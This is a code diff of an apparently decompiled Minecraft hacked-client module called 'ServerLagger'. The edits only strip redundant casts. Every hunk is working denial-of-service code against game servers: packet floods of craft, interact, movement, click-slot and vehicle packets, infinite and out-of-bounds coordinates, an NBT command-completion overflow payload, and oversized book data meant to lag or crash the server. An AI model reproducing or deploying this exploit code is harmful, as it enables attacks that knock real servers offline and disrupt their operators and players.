@@ -105,7 +105,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                         for (RecipeEntry recipe : recipeResultCollection.getRecipes(true)) {
                             int i = 0;
                             while ((double)i < this.craftPackets.getValue()) {
-                                mc.getNetworkHandler().sendPacket((Packet)new CraftRequestC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.currentScreenHandler.syncId, recipe, true));
+                                mc.getNetworkHandler().sendPacket(new CraftRequestC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.currentScreenHandler.syncId, recipe, true));
                                 ++i;
                             }
                         }
@@ -123,17 +123,17 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
             case 2: {
                 int i = 0;
                 while ((double)i < this.sequencePackets.getValue()) {
-                    mc.getNetworkHandler().sendPacket((Packet)new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, -1));
+                    mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, -1));
                     ++i;
                 }
                 break;
             }
             case 3: {
                 Vec3d pos = new Vec3d(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getX(), ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getY(), ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getZ());
-                BlockHitResult bhr = new BlockHitResult(pos, Direction.DOWN, BlockPos.ofFloored((Position)pos), false);
+                BlockHitResult bhr = new BlockHitResult(pos, Direction.DOWN, BlockPos.ofFloored(pos), false);
                 int i = 0;
                 while ((double)i < this.sequencePackets.getValue()) {
-                    mc.getNetworkHandler().sendPacket((Packet)new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, -1));
+                    mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, bhr, -1));
                     ++i;
                 }
                 break;
@@ -147,7 +147,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                     int i = 0;
                     while ((double)i < this.movementPackets.getValue()) {
                         PlayerMoveC2SPacket.Full move_packet = new PlayerMoveC2SPacket.Full(current_pos.x + this.getDistributedRandom(1.0), current_pos.y + this.getDistributedRandom(1.0), current_pos.z + this.getDistributedRandom(1.0), (float)ServerLagger_xbIbOIunYFUorlZcLJkD.rndD(90.0), (float)ServerLagger_xbIbOIunYFUorlZcLJkD.rndD(180.0), true);
-                        mc.getNetworkHandler().sendPacket((Packet)move_packet);
+                        mc.getNetworkHandler().sendPacket(move_packet);
                         ++i;
                     }
                     break;
@@ -165,7 +165,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 String partialCommand = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", overflow);
                 int i = 0;
                 while ((double)i < this.commandPackets.getValue()) {
-                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendPacket((Packet)new RequestCommandCompletionsC2SPacket(0, partialCommand));
+                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
                     ++i;
                 }
                 if (!this.smartDisable.getValue()) break;
@@ -176,7 +176,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 if (!(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.currentScreen instanceof LecternScreen)) {
                     return;
                 }
-                mc.getNetworkHandler().sendPacket((Packet)new ClickSlotC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.currentScreenHandler.syncId, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.currentScreenHandler.getRevision(), 0, 0, SlotActionType.QUICK_MOVE, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.currentScreenHandler.getCursorStack().copy(), Int2ObjectMaps.emptyMap()));
+                mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.currentScreenHandler.syncId, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.currentScreenHandler.getRevision(), 0, 0, SlotActionType.QUICK_MOVE, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.currentScreenHandler.getCursorStack().copy(), Int2ObjectMaps.emptyMap()));
                 if (!this.smartDisable.getValue()) break;
                 this.disable();
                 break;
@@ -185,37 +185,37 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 int i = 0;
                 while ((double)i < this.interactPackets.getValue()) {
                     Vec3d cpos = this.pickRandomPos();
-                    mc.getNetworkHandler().sendPacket((Packet)new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, BlockPos.ofFloored((Position)cpos), false), 0));
+                    mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(cpos, Direction.DOWN, BlockPos.ofFloored(cpos), false), 0));
                     ++i;
                 }
                 break;
             }
             case 7: {
                 Vec3d oob = new Vec3d(Double.POSITIVE_INFINITY, 255.0, Double.NEGATIVE_INFINITY);
-                mc.getNetworkHandler().sendPacket((Packet)new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(oob, Direction.DOWN, BlockPos.ofFloored((Position)oob), false), 0));
+                mc.getNetworkHandler().sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(oob, Direction.DOWN, BlockPos.ofFloored(oob), false), 0));
                 break;
             }
             case 8: {
                 int i = 0;
                 while ((double)i < this.interactPackets.getValue()) {
-                    mc.getNetworkHandler().sendPacket((Packet)new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, 0));
+                    mc.getNetworkHandler().sendPacket(new PlayerInteractItemC2SPacket(Hand.MAIN_HAND, 0));
                     ++i;
                 }
                 break;
             }
             case 9: {
                 Int2ObjectArrayMap REAL = new Int2ObjectArrayMap();
-                REAL.put(0, (Object)new ItemStack((ItemConvertible)Items.RED_DYE, 1));
+                REAL.put(0, new ItemStack(Items.RED_DYE, 1));
                 int i = 0;
                 while ((double)i < this.clickSlotPackets.getValue()) {
-                    mc.getNetworkHandler().sendPacket((Packet)new ClickSlotC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.currentScreenHandler.syncId, 123344, 2957234, 2859623, SlotActionType.PICKUP, new ItemStack((ItemConvertible)Items.AIR, -1), (Int2ObjectMap)REAL));
+                    mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.currentScreenHandler.syncId, 123344, 2957234, 2859623, SlotActionType.PICKUP, new ItemStack(Items.AIR, -1), REAL));
                     ++i;
                 }
                 break;
             }
             case 10: {
                 for (double i = 0.0; i < this.aacPackets.getValue(); i += 1.0) {
-                    mc.getNetworkHandler().sendPacket((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getX() + 9412.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getY() + 9412.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getZ() + 9412.0 * i, true));
+                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getX() + 9412.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getY() + 9412.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getZ() + 9412.0 * i, true));
                 }
                 if (!this.smartDisable.getValue()) break;
                 this.disable();
@@ -223,7 +223,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
             }
             case 11: {
                 for (double i = 0.0; i < this.aacPackets.getValue(); i += 1.0) {
-                    mc.getNetworkHandler().sendPacket((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getX() + 500000.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getY() + 500000.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getZ() + 500000.0 * i, true));
+                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getX() + 500000.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getY() + 500000.0 * i, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getZ() + 500000.0 * i, true));
                 }
                 if (!this.smartDisable.getValue()) break;
                 this.disable();
@@ -231,7 +231,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
             }
             case 12: {
                 for (double i = 0.0; i < this.aacPackets.getValue(); i += 1.0) {
-                    mc.getNetworkHandler().sendPacket((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
+                    mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                 }
                 if (!this.smartDisable.getValue()) break;
                 this.disable();
@@ -258,15 +258,15 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 Vec3d pos = this.pickRandomPos();
                 NbtCompound tag = new NbtCompound();
                 NbtList list = new NbtList();
-                ItemStack the = new ItemStack((ItemConvertible)Items.CAMPFIRE);
-                list.add(NbtDouble.of((double)pos.x));
-                list.add(NbtDouble.of((double)pos.y));
-                list.add(NbtDouble.of((double)pos.z));
-                tag.put("Pos", (NbtElement)list);
-                the.setSubNbt("BlockEntityTag", (NbtElement)tag);
+                ItemStack the = new ItemStack(Items.CAMPFIRE);
+                list.add(NbtDouble.of(pos.x));
+                list.add(NbtDouble.of(pos.y));
+                list.add(NbtDouble.of(pos.z));
+                tag.put("Pos", list);
+                the.setSubNbt("BlockEntityTag", tag);
                 int i = 0;
                 while ((double)i < this.creativePackets.getValue()) {
-                    mc.getNetworkHandler().sendPacket((Packet)new CreativeInventoryActionC2SPacket(1, the));
+                    mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(1, the));
                     ++i;
                 }
                 break;
@@ -284,7 +284,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                 }
                 int i = 0;
                 while ((double)i < this.vehiclePackets.getValue()) {
-                    mc.getNetworkHandler().sendPacket((Packet)new BoatPaddleStateC2SPacket(true, true));
+                    mc.getNetworkHandler().sendPacket(new BoatPaddleStateC2SPacket(true, true));
                     ++i;
                 }
                 break;
@@ -298,11 +298,11 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                     return;
                 }
                 BlockPos start = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getBlockPos();
-                Vec3d end = new Vec3d((double)start.getX() + 0.5, (double)(start.getY() + 1), (double)start.getZ() + 0.5);
+                Vec3d end = new Vec3d((double)start.getX() + 0.5, start.getY() + 1, (double)start.getZ() + 0.5);
                 vehicle.updatePosition(end.x, end.y - 1.0, end.z);
                 int i = 0;
                 while ((double)i < this.vehiclePackets.getValue()) {
-                    mc.getNetworkHandler().sendPacket((Packet)new VehicleMoveC2SPacket(vehicle));
+                    mc.getNetworkHandler().sendPacket(new VehicleMoveC2SPacket(vehicle));
                     ++i;
                 }
                 break;
@@ -310,8 +310,8 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
             case 20: {
                 int index = 0;
                 while ((double)index < this.offhandPackets.getValue()) {
-                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendPacket((Packet)new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.UP));
-                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendPacket((Packet)new PlayerMoveC2SPacket.OnGroundOnly(true));
+                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendPacket(new PlayerActionC2SPacket(PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.UP));
+                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(true));
                     ++index;
                 }
                 break;
@@ -324,10 +324,10 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
             }
             case 19: {
                 for (double yPos = ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getY(); yPos < 255.0; yPos += 5.0) {
-                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendPacket((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getX(), yPos, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getZ(), true));
+                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getX(), yPos, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getZ(), true));
                 }
                 for (double i = 0.0; i < 6685.0; i += 5.0) {
-                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendPacket((Packet)new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getX() + i, 255.0, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getZ() + i, true));
+                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getX() + i, 255.0, ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getZ() + i, true));
                 }
                 break;
             }
@@ -353,14 +353,14 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
 
     private void sendBadBook() {
         String title = "/stop" + Math.random() * 400.0;
-        String mm255 = RandomStringUtils.randomAlphanumeric((int)255);
+        String mm255 = RandomStringUtils.randomAlphanumeric(255);
         switch (this.mode.getValue().ordinal()) {
             case 13: {
                 ArrayList<String> pages = new ArrayList<String>();
                 for (int i = 0; i < 50; ++i) {
                     pages.add(mm255);
                 }
-                mc.getNetworkHandler().sendPacket((Packet)new BookUpdateC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
+                mc.getNetworkHandler().sendPacket(new BookUpdateC2SPacket(ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.getInventory().selectedSlot, pages, Optional.of(title)));
                 break;
             }
             case 14: {
@@ -370,17 +370,17 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
                         return;
                     }
                     ++this.slot;
-                    ItemStack book = new ItemStack((ItemConvertible)Items.WRITTEN_BOOK, 1);
+                    ItemStack book = new ItemStack(Items.WRITTEN_BOOK, 1);
                     NbtCompound tag = new NbtCompound();
                     NbtList list = new NbtList();
                     for (int j = 0; j < 99; ++j) {
-                        list.add(NbtString.of((String)("{\"text\":" + RandomStringUtils.randomAlphabetic((int)200) + "\"}")));
+                        list.add(NbtString.of("{\"text\":" + RandomStringUtils.randomAlphabetic(200) + "\"}"));
                     }
-                    tag.put("author", (NbtElement)NbtString.of((String)RandomStringUtils.randomAlphabetic((int)9000)));
-                    tag.put("title", (NbtElement)NbtString.of((String)RandomStringUtils.randomAlphabetic((int)25564)));
-                    tag.put("pages", (NbtElement)list);
+                    tag.put("author", NbtString.of(RandomStringUtils.randomAlphabetic(9000)));
+                    tag.put("title", NbtString.of(RandomStringUtils.randomAlphabetic(25564)));
+                    tag.put("pages", list);
                     book.setNbt(tag);
-                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendPacket((Packet)new CreativeInventoryActionC2SPacket(this.slot, book));
+                    ServerLagger_xbIbOIunYFUorlZcLJkD.mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(this.slot, book));
                 }
                 break;
             }
@@ -392,7 +392,7 @@ extends Module_eSdgMXWuzcxgQVaJFmKZ {
     }
 
     private Vec3d pickRandomPos() {
-        return new Vec3d((double)new Random().nextInt(0xFFFFFF), 255.0, (double)new Random().nextInt(0xFFFFFF));
+        return new Vec3d(new Random().nextInt(0xFFFFFF), 255.0, new Random().nextInt(0xFFFFFF));
     }
 
     private String generateJsonObject(int levels) {
